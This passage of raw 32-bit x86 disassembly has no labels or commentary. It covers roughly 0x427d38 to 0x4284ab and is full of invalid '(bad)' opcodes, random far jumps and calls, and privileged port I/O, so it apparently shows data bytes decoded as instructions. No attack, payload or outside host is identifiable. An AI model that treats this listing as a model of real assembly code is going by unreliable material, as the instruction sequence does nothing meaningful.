  427d38:	outs   dx,DWORD PTR ds:[esi]
  427d39:	push   edx
  427d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d3b:	jp     0x427cf9
  427d3d:	xlat   BYTE PTR ds:[ebx]
  427d3e:	data16 cmc 
  427d40:	xchg   esi,eax
  427d41:	(bad)  
  427d42:	not    esp
  427d44:	nop
  427d45:	jno    0x427d72
  427d47:	inc    esp
  427d48:	int3   
  427d49:	inc    esi
  427d4a:	fimul  DWORD PTR [ebp-0x1e139b3e]
  427d50:	pop    ebp
  427d51:	dec    ebp
  427d52:	mov    cl,dh
  427d54:	in     eax,0x80
  427d56:	mov    esp,0x72263d37
  427d5b:	inc    ebp
  427d5c:	je     0x427d92
  427d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d5f:	dec    ebp
  427d60:	pop    ecx
  427d61:	test   eax,0x5ee6ec6c
  427d66:	mov    ebp,gs
  427d68:	push   esi
  427d69:	clc    
  427d6a:	stos   BYTE PTR es:[edi],al
  427d6b:	es leave 
  427d6d:	xlat   BYTE PTR ds:[ebx]
  427d6e:	in     eax,dx
  427d6f:	sbb    al,0x9b
  427d71:	int    0xcb
  427d73:	call   0xc10c1cd2
  427d78:	jno    0x427cff
  427d7a:	cwde   
  427d7b:	cmc    
  427d7c:	fwait
  427d7d:	mov    al,0x16
  427d7f:	jnp    0x427d50
  427d81:	test   DWORD PTR [eax],0xbb7b11df
  427d87:	js     0x427d31
  427d89:	ss push es
  427d8b:	fstp   QWORD PTR [ebp-0x57772659]
  427d91:	(bad)  
  427d92:	mov    edi,0xa071addd
  427d97:	sti    
  427d98:	adc    bl,BYTE PTR [ecx-0x6d907249]
  427d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d9f:	and    BYTE PTR [edi],dh
  427da1:	retf   0x5d2a
  427da4:	cmp    edx,DWORD PTR [ebp-0x3]
  427da7:	mov    cl,0x14
  427da9:	out    dx,al
  427daa:	sbb    DWORD PTR [edi+ecx*1-0x52ec928a],ecx
  427db1:	ret    0xf3c2
  427db4:	aas    
  427db5:	into   
  427db6:	es cmp al,0x48
  427db9:	fisub  DWORD PTR [ebx]
  427dbb:	loope  0x427da8
  427dbd:	xor    al,0x7b
  427dbf:	(bad)  
  427dc0:	loope  0x427d60
  427dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427dc3:	xor    BYTE PTR [di+0x2a],ch
  427dc7:	(bad)  
  427dc8:	outs   dx,BYTE PTR ds:[esi]
  427dc9:	fstp   DWORD PTR [ecx+esi*2+0x2715e74b]
  427dd0:	mov    eax,0x4e79e8c6
  427dd5:	push   ds
  427dd6:	xor    BYTE PTR [edx],0x2b
  427dd9:	rcl    ebp,0xa
  427ddc:	mov    al,0x3f
  427dde:	pop    esp
  427ddf:	pop    ebp
  427de0:	test   ecx,edi
  427de2:	pop    esi
  427de3:	jmp    0x427e0a
  427de5:	xor    eax,0x457ca3bf
  427dea:	sub    ecx,esi
  427dec:	icebp  
  427ded:	dec    esi
  427dee:	cdq    
  427def:	test   eax,0xaba4c067
  427df4:	das    
  427df5:	dec    ecx
  427df6:	push   ss
  427df7:	fstp   st(2)
  427df9:	lds    ebx,FWORD PTR [edx+0x7e]
  427dfc:	jmp    0xfd59:0xf04e9352
  427e03:	outs   dx,BYTE PTR ds:[esi]
  427e04:	jne    0x427e64
  427e06:	sub    al,0xf4
  427e08:	pop    ds
  427e09:	dec    ecx
  427e0a:	push   eax
  427e0b:	out    0x15,al
  427e0d:	in     al,0xaf
  427e0f:	pusha  
  427e10:	adc    al,0x19
  427e12:	test   DWORD PTR [ecx],edx
  427e14:	mov    ah,0x11
  427e16:	pop    eax
  427e17:	ins    DWORD PTR es:[edi],dx
  427e18:	dec    esp
  427e19:	adc    edx,DWORD PTR [edi+edi*1]
  427e1c:	sbb    ah,BYTE PTR [edx]
  427e1e:	xor    al,0x18
  427e20:	fs call 0xa1ea4f28
  427e26:	push   edx
  427e27:	retf   
  427e28:	or     bl,BYTE PTR [ebx+0x59a80b02]
  427e2e:	push   cs
  427e2f:	jmp    DWORD PTR [ebp-0x432f2a52]
  427e35:	sbb    ecx,0xf9051dd0
  427e3b:	cmp    ecx,DWORD PTR [ebp-0xc]
  427e3e:	je     0x427e15
  427e40:	jmp    0x82592eae
  427e45:	in     eax,dx
  427e46:	jmp    0x189cccc5
  427e4b:	jge    0x427e66
  427e4d:	retf   0xb19b
  427e50:	js     0x427df8
  427e52:	adc    ah,BYTE PTR cs:[edi-0x52]
  427e56:	mov    edi,0x91791332
  427e5b:	xor    eax,0x94c7a01d
  427e60:	ja     0x427eaa
  427e62:	test   BYTE PTR [ecx-0x34],al
  427e65:	daa    
  427e66:	scas   eax,DWORD PTR es:[edi]
  427e67:	sub    ebp,ecx
  427e69:	cli    
  427e6a:	mov    dl,BYTE PTR [esi+0x365b02dd]
  427e70:	xlat   BYTE PTR ds:[ebx]
  427e71:	pop    ss
  427e72:	mov    edi,0xce09beb2
  427e77:	pop    esi
  427e78:	mov    bl,bh
  427e7a:	sbb    dh,BYTE PTR [edx-0x1c]
  427e7d:	(bad)  
  427e7e:	lock mov bl,0x2e
  427e81:	sub    al,0x30
  427e83:	and    DWORD PTR [edx-0x325fb774],ebp
  427e89:	cmp    al,0x27
  427e8b:	add    DWORD PTR [edi+ebp*1],edx
  427e8e:	inc    ebx
  427e8f:	or     al,0x5d
  427e91:	mov    dh,0xcd
  427e93:	cwde   
  427e94:	cld    
  427e95:	loope  0x427e57
  427e97:	fs out 0xe9,eax
  427e9a:	mov    esp,0xd9747165
  427e9f:	ret    0x51d7
  427ea2:	test   DWORD PTR [ebp+edi*8+0x7b],edx
  427ea6:	push   0xb6e344c7
  427eab:	js     0x427e73
  427ead:	sub    DWORD PTR [eax+0x744b4848],edi
  427eb3:	sub    dh,ch
  427eb5:	call   0xf1f5:0x482cc6d9
  427ebc:	sub    al,0x97
  427ebe:	loopne 0x427edf
  427ec0:	lahf   
  427ec1:	or     al,0xc2
  427ec3:	push   cs
  427ec4:	(bad)  
  427ec5:	jg     0x427f17
  427ec7:	(bad)  
  427ec8:	xor    BYTE PTR [ebp+0xa7ca25a],dl
  427ece:	xchg   ecx,eax
  427ecf:	fcom   QWORD PTR [ecx-0x1c12e116]
  427ed5:	dec    DWORD PTR [ecx]
  427ed7:	xor    dh,BYTE PTR [edx]
  427ed9:	stos   DWORD PTR es:[edi],eax
  427eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427edb:	fld    DWORD PTR [edi]
  427edd:	or     al,0x43
  427edf:	aad    0x5
  427ee1:	dec    edi
  427ee2:	(bad)  
  427ee3:	lods   eax,DWORD PTR ds:[esi]
  427ee4:	pop    ebp
  427ee5:	fistp  QWORD PTR [edx+0x1b]
  427ee8:	jb     0x427f44
  427eea:	jnp    0x427ea5
  427eec:	out    0xe9,eax
  427eee:	mov    edx,0xbc23c3e8
  427ef3:	popa   
  427ef4:	lds    esp,FWORD PTR [ecx-0x48]
  427ef7:	xchg   ecx,eax
  427ef8:	inc    esi
  427ef9:	jns    0x427f38
  427efb:	cmc    
  427efc:	xchg   ebx,edi
  427efe:	lahf   
  427eff:	bound  ebp,QWORD PTR [ebp+0x14]
  427f02:	popf   
  427f03:	push   0x1
  427f05:	lahf   
  427f06:	idiv   esi
  427f08:	cs mov ch,0xff
  427f0b:	push   ds
  427f0c:	cmp    al,0xef
  427f0e:	pop    es
  427f0f:	ffreep st(6)
  427f11:	fistp  WORD PTR [edx]
  427f13:	gs out 0x84,al
  427f16:	inc    ecx
  427f17:	or     DWORD PTR [esi-0x4a],ebp
  427f1a:	mov    cs,WORD PTR [ebp+edi*4-0x1b]
  427f1e:	xchg   esi,eax
  427f1f:	pop    ds
  427f20:	add    DWORD PTR [edx-0x3c11a286],edi
  427f26:	xchg   DWORD PTR [ecx],edx
  427f28:	test   al,0xd4
  427f2a:	sbb    al,0x7c
  427f2c:	sbb    dh,BYTE PTR [edx+0x7daee4ae]
  427f32:	jne    0x427f1c
  427f34:	jecxz  0x427f42
  427f36:	inc    edi
  427f37:	jle    0x427efa
  427f39:	sbb    bl,BYTE PTR [edx]
  427f3b:	std    
  427f3c:	fstp   TBYTE PTR cs:[ebp+edi*8+0x2b17d716]
  427f44:	inc    esp
  427f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f46:	sti    
  427f47:	retf   
  427f48:	ss jmp 0xea4a:0xa85b7517
  427f50:	ins    DWORD PTR es:[edi],dx
  427f51:	jge    0x427f0c
  427f53:	mov    bl,0x44
  427f55:	out    0x28,eax
  427f57:	ror    BYTE PTR [ebx-0x1f63e1de],cl
  427f5d:	lods   al,BYTE PTR ds:[esi]
  427f5e:	and    edi,DWORD PTR [edi+ebp*2]
  427f61:	xchg   edi,eax
  427f62:	add    ch,BYTE PTR [ebp+0x4fec3e79]
  427f68:	dec    esp
  427f69:	and    BYTE PTR [ecx+0x3a],ch
  427f6c:	pop    ss
  427f6d:	mov    cl,0x28
  427f6f:	ror    cl,0x28
  427f72:	sub    al,0x21
  427f74:	and    bh,bh
  427f76:	pop    ebx
  427f77:	mov    al,0x77
  427f79:	adc    ch,BYTE PTR [eiz*1-0x20e429c1]
  427f80:	xor    dl,bl
  427f82:	retf   0xb083
  427f85:	test   BYTE PTR [ebx-0x475664bb],0x84
  427f8c:	or     ah,BYTE PTR [ebx+edi*4-0x68]
  427f90:	test   ebp,edx
  427f92:	jp     0x427f2e
  427f94:	jle    0x427f69
  427f96:	mov    bl,0x2d
  427f98:	pop    edx
  427f99:	test   BYTE PTR [ebx],ch
  427f9b:	stos   DWORD PTR es:[edi],eax
  427f9c:	bound  edx,QWORD PTR [edi]
  427f9e:	dec    eax
  427f9f:	mul    BYTE PTR [esi+0x30744f4a]
  427fa5:	or     al,0xb7
  427fa7:	aas    
  427fa8:	pop    DWORD PTR [edx-0x18]
  427fab:	and    eax,ebx
  427fad:	clc    
  427fae:	or     cl,BYTE PTR [ebx+edx*2]
  427fb1:	lods   al,BYTE PTR ds:[esi]
  427fb2:	sub    dl,BYTE PTR [esi+0x40]
  427fb5:	stos   DWORD PTR es:[edi],eax
  427fb6:	(bad)  
  427fb7:	mov    ebp,0x71e4971d
  427fbc:	(bad)  
  427fbd:	ror    DWORD PTR [ebx-0x69],1
  427fc0:	mov    ecx,0xc9c7a8a5
  427fc5:	inc    ebp
  427fc6:	mov    ds:0x62719c31,al
  427fcb:	adc    BYTE PTR [esi+0x3d968bf0],ch
  427fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fd2:	std    
  427fd3:	dec    dl
  427fd5:	icebp  
  427fd6:	sti    
  427fd7:	push   esp
  427fd8:	aad    0x60
  427fda:	xor    ch,al
  427fdc:	jno    0x428013
  427fde:	into   
  427fdf:	pop    es
  427fe0:	mov    BYTE PTR [esi+0x47],ch
  427fe3:	arpl   sp,si
  427fe5:	pusha  
  427fe6:	imul   ebx,esp,0xc53a57e3
  427fec:	jl     0x42803e
  427fee:	cld    
  427fef:	loope  0x427fbd
  427ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ff2:	shl    ch,1
  427ff4:	or     dl,ch
  427ff6:	xchg   edx,eax
  427ff7:	mov    dh,0xa0
  427ff9:	or     DWORD PTR [ecx+eiz*1-0x68],ebx
  427ffd:	or     DWORD PTR [esi],edi
  427fff:	sbb    al,0x98
  428001:	loope  0x42801b
  428003:	cmp    bl,cl
  428005:	nop
  428006:	call   0x315cc0a1
  42800b:	xor    bl,BYTE PTR [edi+0x72b16326]
  428011:	sbb    DWORD PTR [eax-0x4e],edx
  428014:	dec    edx
  428015:	scas   eax,DWORD PTR es:[edi]
  428016:	sbb    BYTE PTR [edi-0x13],dl
  428019:	pop    edi
  42801a:	cwde   
  42801b:	jo     0x427ffb
  42801d:	ins    DWORD PTR es:[edi],dx
  42801e:	stc    
  42801f:	cmp    al,0xa
  428021:	mov    esi,0x8ea041ab
  428026:	cmc    
  428027:	xor    al,0x71
  428029:	mov    eax,0x9a03f87f
  42802e:	imul   edi,DWORD PTR [ebp-0x5a],0x61
  428032:	sub    al,ah
  428034:	xlat   BYTE PTR ds:[ebx]
  428035:	clc    
  428036:	shr    BYTE PTR [ebx+0x58],1
  428039:	mov    ebx,eax
  42803b:	fild   QWORD PTR [ebp-0x2a]
  42803e:	mov    ebp,0x1339392f
  428043:	add    al,0x1d
  428045:	aas    
  428046:	mov    esp,0x8388945a
  42804b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42804c:	xor    cl,dh
  42804e:	jae    0x4280c7
  428050:	jno    0x427fe6
  428052:	cmp    ecx,esi
  428054:	xchg   ebx,eax
  428055:	in     eax,0x2a
  428057:	fxch   st(6)
  428059:	push   cs
  42805a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42805b:	inc    ebx
  42805c:	mov    ebx,0x71c21b95
  428061:	xlat   BYTE PTR ds:[ebx]
  428062:	neg    DWORD PTR [edx-0x5569d92d]
  428068:	loope  0x428032
  42806a:	adc    dh,BYTE PTR [edi-0x41]
  42806d:	fidivr DWORD PTR [edx]
  42806f:	xchg   edx,eax
  428070:	(bad)  
  428071:	fnstcw WORD PTR [ecx-0x74c98581]
  428077:	xor    al,0xd9
  428079:	test   al,0xba
  42807b:	js     0x4280a2
  42807d:	cmp    eax,0xe8982835
  428082:	sar    DWORD PTR [edi+0x33ce974c],1
  428088:	popa   
  428089:	ss inc eax
  42808b:	aad    0x1a
  42808d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42808e:	jle    0x4280a9
  428090:	scas   eax,DWORD PTR es:[edi]
  428091:	push   ebx
  428092:	aad    0xf4
  428094:	lea    eax,[ebx-0x3c]
  428097:	sar    ch,1
  428099:	and    BYTE PTR [edx-0x27ccefe0],dh
  42809f:	inc    esi
  4280a0:	fmulp  st(0),st
  4280a2:	add    al,BYTE PTR [edi]
  4280a4:	add    eax,0x7724b4ab
  4280a9:	(bad)  
  4280aa:	mov    edx,0xd06edec6
  4280af:	add    al,0x93
  4280b1:	xchg   esi,eax
  4280b2:	dec    ebx
  4280b3:	push   ebp
  4280b4:	jae    0x428074
  4280b6:	sbb    dl,BYTE PTR ds:0x29841cd7
  4280bc:	stos   BYTE PTR es:[edi],al
  4280bd:	xlat   BYTE PTR ds:[ebx]
  4280be:	out    dx,eax
  4280bf:	dec    ebp
  4280c0:	cmp    al,ch
  4280c2:	(bad)  
  4280c3:	xchg   ebp,eax
  4280c4:	das    
  4280c5:	jge    0x4280ce
  4280c7:	dec    ebp
  4280c8:	inc    edi
  4280c9:	dec    DWORD PTR [ebx-0x31]
  4280cc:	ins    DWORD PTR es:[edi],dx
  4280cd:	fst    st(7)
  4280cf:	adc    al,dl
  4280d1:	outs   dx,DWORD PTR ds:[esi]
  4280d2:	aaa    
  4280d3:	adc    eax,0x68a47de1
  4280d8:	pop    ebx
  4280d9:	add    esp,edi
  4280db:	adc    esi,DWORD PTR [esi+0x0]
  4280e1:	add    dh,al
  4280e3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4280e5:	push   eax
  4280e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280e7:	shl    bh,cl
  4280e9:	div    DWORD PTR [ebx+0x2b2768be]
  4280ef:	test   edi,ecx
  4280f1:	sbb    eax,0x1f87a
  4280f6:	repz add al,0x0
  4280f9:	add    BYTE PTR [eax+0x30],dl
  4280fc:	adc    BYTE PTR [ebx-0x714b8d4e],bl
  428102:	sbb    DWORD PTR [edx],ebx
  428104:	cmp    BYTE PTR [eax-0x4b397fb0],dl
  42810a:	(bad)  [ebx+0x3f]
  42810d:	in     eax,0xa5
  42810f:	inc    esp
  428110:	stos   BYTE PTR es:[edi],al
  428111:	xchg   DWORD PTR ds:0x63c609a7,ecx
  428117:	add    ch,dh
  428119:	push   eax
  42811a:	(bad)  
  42811b:	hlt    
  42811c:	sbb    al,0x3f
  42811e:	mov    edx,0xee966ad9
  428123:	sbb    dh,0x7e
  428126:	inc    esp
  428127:	push   ebp
  428128:	ds retf 
  42812a:	jmp    0x8ffb:0xb54298ac
  428131:	fs rol esp,cl
  428134:	mov    ebp,0x6f07538f
  428139:	adc    eax,0xdc29f94d
  42813e:	mov    dh,0xe3
  428140:	test   al,0xca
  428142:	sbb    BYTE PTR [ebx+0x4c],0x6e
  428146:	adc    BYTE PTR [ecx+0x7c241a48],bl
  42814c:	setg   BYTE PTR [ecx-0x2f]
  428150:	aas    
  428151:	pop    edi
  428152:	lahf   
  428153:	add    ah,ah
  428155:	ret    0x6454
  428158:	mov    ecx,0x70df650f
  42815d:	jae    0x428149
  42815f:	add    al,al
  428161:	mov    ebx,0x812e74fe
  428166:	cmp    bl,BYTE PTR [esi-0x743df3fa]
  42816c:	fdivr  DWORD PTR [ecx-0x6b28cc1d]
  428172:	mov    BYTE PTR [ebp+0x2cb3e418],bl
  428178:	mov    eax,ds:0x4a2df8b5
  42817d:	adc    edi,DWORD PTR [esi-0x1f8d0252]
  428183:	inc    eax
  428184:	(bad)  
  428185:	adc    al,0x65
  428187:	(bad)  
  428188:	pop    esp
  428189:	xchg   ebx,eax
  42818a:	add    ebp,esp
  42818c:	pop    ecx
  42818d:	push   ss
  42818e:	cmp    cl,BYTE PTR [ebx+0x6e]
  428191:	pushf  
  428192:	dec    ebx
  428193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428194:	mov    al,ds:0x4d3f1e6b
  428199:	stos   BYTE PTR es:[edi],al
  42819a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42819b:	sub    eax,0x222b11e8
  4281a0:	popf   
  4281a1:	push   es
  4281a2:	sub    eax,0xe0fe6587
  4281a7:	cmp    BYTE PTR ds:0xdfadb9e6,al
  4281ad:	xlat   BYTE PTR ds:[ebx]
  4281ae:	pop    edi
  4281af:	xchg   ebp,eax
  4281b0:	ins    BYTE PTR es:[edi],dx
  4281b1:	loop   0x4281eb
  4281b3:	cld    
  4281b4:	retf   
  4281b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281b6:	out    0x14,eax
  4281b8:	xchg   DWORD PTR [ebp+0x3],edi
  4281bb:	cmp    BYTE PTR [ebp+0x2],al
  4281be:	jb     0x4281f9
  4281c0:	mov    edx,0xcbc5ea4e
  4281c5:	jl     0x428161
  4281c7:	ficomp DWORD PTR [ebp+0x22fa6d02]
  4281cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281ce:	inc    ebp
  4281cf:	sahf   
  4281d0:	test   BYTE PTR [edi+0x598811e2],bh
  4281d6:	lea    esp,[ebx+0x46]
  4281d9:	jmp    0x5fa35909
  4281de:	pusha  
  4281df:	mov    esi,0x244a68f5
  4281e4:	mov    edi,0x9d4a128
  4281e9:	sub    BYTE PTR cs:[esi+0x5f],dh
  4281ed:	out    dx,al
  4281ee:	add    al,0xaf
  4281f0:	lods   al,BYTE PTR ds:[esi]
  4281f1:	adc    DWORD PTR [edx-0x26c330ba],eax
  4281f7:	push   ds
  4281f8:	mov    al,ds:0x96cb5f4e
  4281fd:	les    esp,FWORD PTR [eax]
  4281ff:	dec    edx
  428200:	inc    eax
  428201:	push   edx
  428202:	(bad)  
  428203:	pop    eax
  428204:	int    0xba
  428206:	mov    al,0xad
  428208:	mov    ebp,0xc417b1d1
  42820d:	adc    al,0xd5
  42820f:	pop    ebp
  428210:	loop   0x42825f
  428212:	cmp    DWORD PTR [ebx-0x30f5816c],esp
  428218:	das    
  428219:	push   0x264f518e
  42821e:	jb     0x4281b9
  428220:	mov    ch,0xee
  428222:	push   esi
  428224:	enter  0x75df,0x2c
  428228:	jbe    0x428281
  42822a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42822b:	inc    edi
  42822c:	mov    al,0xb1
  42822e:	aaa    
  42822f:	enter  0xdf7f,0xd0
  428233:	data16 daa 
  428235:	pop    edx
  428236:	ret    0x3a05
  428239:	retf   0xcd17
  42823c:	(bad)  [edx+0x54718a17]
  428242:	iret   
  428243:	mov    al,0xf8
  428245:	scas   al,BYTE PTR es:[edi]
  428246:	push   ebx
  428247:	mov    cl,0xb
  428249:	repz das 
  42824b:	out    dx,eax
  42824c:	lahf   
  42824d:	jge    0x4281ff
  42824f:	adc    DWORD PTR [ebp+0x7a110b7],edi
  428255:	out    dx,al
  428256:	popa   
  428257:	and    al,0xeb
  428259:	retf   
  42825a:	add    al,0xca
  42825c:	popf   
  42825d:	lds    eax,FWORD PTR [ebx-0x72]
  428260:	leave  
  428261:	sub    BYTE PTR [eax-0x47557a2b],ch
  428267:	add    eax,0xf1810c47
  42826c:	xor    dl,ah
  42826e:	lods   al,BYTE PTR ds:[esi]
  42826f:	pop    ecx
  428270:	add    dh,ah
  428272:	xchg   ebx,eax
  428273:	stc    
  428274:	out    0x59,eax
  428276:	int3   
  428277:	aaa    
  428278:	icebp  
  428279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42827a:	sub    eax,0x3b96df19
  42827f:	xor    DWORD PTR [esi+edi*8-0x65b4c569],esi
  428286:	xor    DWORD PTR [esi-0x46],ecx
  428289:	jge    0x42825e
  42828b:	stc    
  42828c:	sub    DWORD PTR [edx+eiz*8+0x1e],esp
  428290:	add    BYTE PTR [eax+0x1e2fa7e5],dl
  428296:	mov    ds:0x1d45b497,eax
  42829b:	cwde   
  42829c:	xchg   edi,eax
  42829d:	push   edi
  42829e:	aaa    
  42829f:	pop    eax
  4282a0:	pop    DWORD PTR [ecx-0x76]
  4282a3:	jb     0x42822b
  4282a5:	dec    edx
  4282a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282a7:	mov    al,0xaf
  4282a9:	pop    eax
  4282aa:	es aad 0x11
  4282ad:	mov    al,0x3e
  4282af:	sub    BYTE PTR [eax],dh
  4282b1:	jg     0x42831c
  4282b3:	in     al,0x58
  4282b5:	inc    ecx
  4282b6:	hlt    
  4282b7:	jb     0x4282dc
  4282b9:	(bad)
  4282bc:	push   ecx
  4282bd:	lds    eax,FWORD PTR [eax]
  4282bf:	addr16 pop ecx
  4282c1:	popf   
  4282c2:	das    
  4282c3:	cli    
  4282c4:	lods   al,BYTE PTR ds:[esi]
  4282c5:	int    0x88
  4282c7:	jmp    0x428339
  4282c9:	inc    edx
  4282ca:	inc    esp
  4282cb:	inc    edx
  4282cc:	popa   
  4282cd:	sar    ah,cl
  4282cf:	stc    
  4282d0:	dec    edx
  4282d1:	stos   DWORD PTR es:[edi],eax
  4282d2:	push   ebx
  4282d3:	and    eax,ebp
  4282d5:	sbb    eax,0x728d771e
  4282da:	mov    cl,0xe9
  4282dc:	push   0x5df1dd57
  4282e1:	je     0x428269
  4282e3:	ins    DWORD PTR es:[edi],dx
  4282e4:	outs   dx,DWORD PTR ds:[esi]
  4282e5:	xor    DWORD PTR [ecx+edx*1-0x2e2d8a82],edi
  4282ec:	aas    
  4282ed:	mov    eax,ds:0x8e72b03f
  4282f2:	push   0xefa812b
  4282f7:	das    
  4282f8:	scas   eax,DWORD PTR es:[edi]
  4282f9:	mov    dl,0xdd
  4282fb:	es push ds
  4282fd:	pop    eax
  4282fe:	inc    edx
  4282ff:	mul    DWORD PTR [ecx-0x16]
  428302:	shl    DWORD PTR [ebp+0x3c5500a1],0x4f
  428309:	out    dx,al
  42830a:	dec    eax
  42830b:	dec    edi
  42830c:	sub    DWORD PTR [eax+ebx*2+0x51],esi
  428310:	push   es
  428311:	or     edi,ecx
  428313:	mov    edi,DWORD PTR [esi+eiz*2]
  428316:	inc    eax
  428317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428318:	ret    
  428319:	jb     0x428334
  42831b:	cmp    DWORD PTR [edi-0x90b4e24],esp
  428321:	stos   DWORD PTR es:[edi],eax
  428322:	dec    esp
  428323:	adc    al,0x93
  428325:	adc    eax,edi
  428327:	inc    ecx
  428328:	pop    edx
  428329:	mov    ch,0xc0
  42832b:	cmp    DWORD PTR [ecx],ecx
  42832d:	xor    eax,0x8d64ebf1
  428332:	ss xchg ebx,eax
  428334:	and    eax,DWORD PTR [ebp+0x44bd6e62]
  42833a:	mov    BYTE PTR [edx],dl
  42833c:	jne    0x42837d
  42833e:	and    eax,0x265a2b6e
  428343:	test   edx,0x13a5ea57
  428349:	and    BYTE PTR [edx],bl
  42834b:	repnz lock and eax,DWORD PTR cs:[ebx+0xa]
  428351:	loope  0x4283b7
  428353:	in     al,0x13
  428355:	or     esp,eax
  428357:	push   ebp
  428358:	jnp    0x42834c
  42835a:	mov    dl,0xfa
  42835c:	das    
  42835d:	and    eax,eax
  42835f:	push   eax
  428360:	cmp    DWORD PTR [eax],esi
  428362:	loope  0x428389
  428364:	add    eax,0x8fbfc11d
  428369:	iret   
  42836a:	in     al,dx
  42836b:	mov    ds:0x34b3672,al
  428370:	in     eax,0x15
  428372:	arpl   WORD PTR [ecx+0x4bb7b093],ax
  428378:	xchg   esi,eax
  428379:	jge    0x428306
  42837b:	ins    BYTE PTR es:[edi],dx
  42837c:	sbb    DWORD PTR [edx],eax
  42837e:	das    
  42837f:	fwait
  428380:	mov    eax,ds:0xde8e20f1
  428385:	stc    
  428386:	jg     0x4283b6
  428388:	nop
  428389:	xor    ebp,DWORD PTR [ebp-0x2a79d66a]
  42838f:	add    BYTE PTR [edi],ch
  428391:	mov    eax,ds:0xa42a5def
  428396:	mov    ch,0x7d
  428398:	sti    
  428399:	pop    esi
  42839a:	pop    esp
  42839b:	inc    esp
  42839c:	adc    ebp,edi
  42839e:	sar    BYTE PTR [ecx+0x1],cl
  4283a1:	stos   DWORD PTR es:[edi],eax
  4283a2:	jl     0x42836c
  4283a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283a5:	mov    ebp,edx
  4283a7:	sub    al,0x28
  4283a9:	(bad)
  4283ad:	xor    al,0xb2
  4283af:	inc    ebp
  4283b0:	out    0xde,eax
  4283b2:	dec    ebx
  4283b3:	dec    edx
  4283b4:	and    DWORD PTR [edi-0x5b],edx
  4283b7:	add    ecx,eax
  4283b9:	into   
  4283ba:	(bad)  
  4283bb:	ret    0x81b9
  4283be:	jg     0x428431
  4283c0:	test   BYTE PTR [ecx+ebp*8],ah
  4283c3:	aad    0xa2
  4283c5:	fstp   QWORD PTR [esi+0x376d1f8]
  4283cb:	and    BYTE PTR [bp+0x2559],bl
  4283d0:	jns    0x42844c
  4283d2:	mov    eax,ds:0x98818667
  4283d7:	in     al,0xf1
  4283d9:	push   edx
  4283da:	in     al,dx
  4283db:	in     eax,dx
  4283dc:	pop    ebp
  4283dd:	call   DWORD PTR ds:0x721fd51e
  4283e3:	inc    edi
  4283e4:	push   ebx
  4283e5:	cmp    DWORD PTR [ecx+0x63],ecx
  4283e8:	inc    eax
  4283e9:	ss test eax,0x5d0f0225
  4283ef:	je     0x428430
  4283f1:	jae    0x4283e1
  4283f3:	ret    0x2573
  4283f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283f7:	mov    ds:0xc84a1898,al
  4283fc:	dec    ecx
  4283fd:	dec    esi
  4283fe:	fucomi st,st(6)
  428400:	call   0x1e0f:0x222ecb90
  428407:	outs   dx,DWORD PTR ds:[esi]
  428408:	fisttp WORD PTR [edx-0x1073366c]
  42840e:	ror    DWORD PTR [edi-0x73],0xda
  428412:	adc    ebp,DWORD PTR [ebp+0x30b8897f]
  428418:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  42841a:	mov    ebp,0x66c36866
  42841f:	stc    
  428420:	add    DWORD PTR [ebp+0x29876cc2],edi
  428426:	leave  
  428427:	mov    ebx,0x9dc69932
  42842c:	pop    esi
  42842d:	js     0x428412
  42842f:	mov    ebx,DWORD PTR [ecx+0x402ff0a5]
  428435:	es dec edi
  428437:	out    0xf3,eax
  428439:	ja     0x428410
  42843b:	add    ecx,0x39
  42843e:	test   BYTE PTR [ecx-0x4b1aa831],0x62
  428445:	xchg   esp,eax
  428446:	pop    edi
  428447:	inc    edx
  428448:	pop    ebp
  428449:	pop    ebx
  42844a:	jo     0x428469
  42844c:	(bad)  
  42844d:	popa   
  42844e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42844f:	fmul   QWORD PTR [ebp+0x4c2abb09]
  428455:	mov    ds:0xbebe9410,al
  42845a:	add    al,0x54
  42845c:	aad    0xc1
  42845e:	adc    eax,0xb41272f1
  428463:	sub    eax,DWORD PTR [edx+0x6c]
  428466:	mov    cs,WORD PTR [esi-0x7d]
  428469:	and    DWORD PTR [esi],edx
  42846b:	call   0x25f7:0x724e9f3a
  428472:	addr16 cmc 
  428474:	push   esp
  428475:	jnp    0x4283fd
  428477:	xor    ebx,DWORD PTR [ecx+0x11]
  42847a:	(bad)  
  42847c:	add    cl,bl
  42847e:	mov    dh,0xf1
  428480:	pop    es
  428481:	pop    eax
  428482:	fwait
  428483:	in     eax,0x73
  428485:	mov    esp,0xf2fe302
  42848a:	test   eax,0x6a2ca657
  42848f:	push   ss
  428490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428491:	stos   DWORD PTR es:[edi],eax
  428492:	ins    BYTE PTR es:[edi],dx
  428493:	mov    cl,0xab
  428495:	inc    esi
  428496:	pushf  
  428497:	call   0x997dd456
  42849c:	pop    DWORD PTR [edx+ecx*1]
  42849f:	sub    BYTE PTR [esi+0x64],al
  4284a2:	xor    bh,BYTE PTR [ecx-0x45]
  4284a5:	test   eax,edi
  4284a7:	dec    edi
  4284a8:	iret   
  4284a9:	gs pop edi
  4284ab:	cmc    
